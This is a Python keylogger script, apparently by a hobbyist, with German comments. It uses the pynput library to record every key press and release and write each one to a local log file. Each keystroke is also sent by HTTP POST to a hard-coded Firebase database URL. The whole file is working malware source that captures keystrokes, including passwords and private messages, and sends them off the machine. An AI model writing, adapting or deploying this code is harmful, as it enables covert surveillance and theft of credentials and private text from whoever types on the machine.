import os
import json
import datetime
import threading
from pathlib import Path

import requests
from pynput import keyboard

# ---------------------------------------------------------------
# BANNER
# ---------------------------------------------------------------
print("╔═══════════════════════════════════════╗")
print("║  KeyLogger by lzwdev                  ║")
print("║  Last update: 3. November 2026 10:25  ║")
print("╚═══════════════════════════════════════╝")

# ---------------------------------------------------------------
# KONFIG
# ---------------------------------------------------------------
DB_URL = "https://data-df966-default-rtdb.europe-west1.firebasedatabase.app"

CONFIG_DIR  = Path.home() / ".macbook_keylogger"
CONFIG_FILE = CONFIG_DIR / "config.json"
LOG_DIR     = Path.home() / "Documents" / "KeyLogs"


# ---------------------------------------------------------------
# 1) MacBook-Name einmalig abfragen und speichern
# ---------------------------------------------------------------
def load_or_ask_macbook_name():
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    if CONFIG_FILE.exists():
        try:
            name = json.loads(CONFIG_FILE.read_text(encoding="utf-8")).get("macbook_name")
            if name:
                print(f"[i] MacBook-Name: {name}")
                return name
        except Exception:
            pass

    name = input("Name deines MacBooks: ").strip() or "Unbenanntes-MacBook"
    CONFIG_FILE.write_text(json.dumps({"macbook_name": name}, indent=2), encoding="utf-8")
    print(f"[✓] Gespeichert: {CONFIG_FILE}")
    return name


# ---------------------------------------------------------------
# 2) Logger (lokal + Firebase via REST)
# ---------------------------------------------------------------
class KeyLogger:
    def __init__(self, macbook_name):
        self.macbook_name = macbook_name
        self.lock = threading.Lock()

        LOG_DIR.mkdir(parents=True, exist_ok=True)
        today = datetime.date.today().isoformat()
        self.log_file = LOG_DIR / f"keys_{macbook_name}_{today}.log"

        # Firebase-Pfad für heute
        self.fb_path = f"{DB_URL}/logs/{macbook_name}/{today}.json"
        self.session = requests.Session()

    def log(self, key_repr, event_type="press"):
        now = datetime.datetime.now()
        payload = {
            "time": now.strftime("%H:%M:%S"),
            "second": now.second,
            "timestamp": now.isoformat(timespec="seconds"),
            "key": key_repr,
            "event": event_type,
            "macbook": self.macbook_name,
        }

        # lokal anhängen
        with self.lock:
            with self.log_file.open("a", encoding="utf-8") as f:
                f.write(json.dumps(payload, ensure_ascii=False) + "\n")

        # Firebase: POST = neuer Eintrag mit Auto-ID (wie push())
        try:
            r = self.session.post(self.fb_path, json=payload, timeout=5)
            if r.status_code >= 300:
                print(f"[!] Firebase {r.status_code}: {r.text[:120]}")
        except Exception as e:
            print(f"[!] Firebase-Fehler: {e}")

        return payload


# ---------------------------------------------------------------
# 3) Tastatur-Handler
# ---------------------------------------------------------------
def make_handlers(logger):
    def on_press(key):
        try:
            kr = key.char
        except AttributeError:
            kr = str(key)
        d = logger.log(kr, "press")
        print(f"[{d['time']}] {kr}")

    def on_release(key):
        try:
            kr = key.char
        except AttributeError:
            kr = str(key)
        logger.log(kr, "release")
        if key == keyboard.Key.esc:
            print("\n[✓] Stop.")
            return False

    return on_press, on_release


# ---------------------------------------------------------------
# 4) Main
# ---------------------------------------------------------------
def main():
    name = load_or_ask_macbook_name()
    logger = KeyLogger(name)

    print(f"[i] Lokal:  {logger.log_file}")
    print(f"[i] Firebase: {logger.fb_path}")
    print("Läuft … ESC beendet.\n")

    on_press, on_release = make_handlers(logger)
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()
